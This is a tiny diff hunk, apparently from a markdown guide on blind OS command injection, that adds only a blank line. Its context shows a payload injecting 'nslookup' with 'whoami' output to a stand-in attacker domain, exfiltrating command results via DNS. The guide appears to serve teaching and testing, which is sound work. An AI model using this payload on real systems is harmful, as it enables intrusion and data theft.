@@ -34,6 +34,7 @@ Once we’ve confirmed blind OS command injection, we can exfiltrate the output 
 {% endhint %}
 
 
+
 ```bash
 & nslookup `whoami`.kgji2ohoyw.web-attacker.com &
 ```
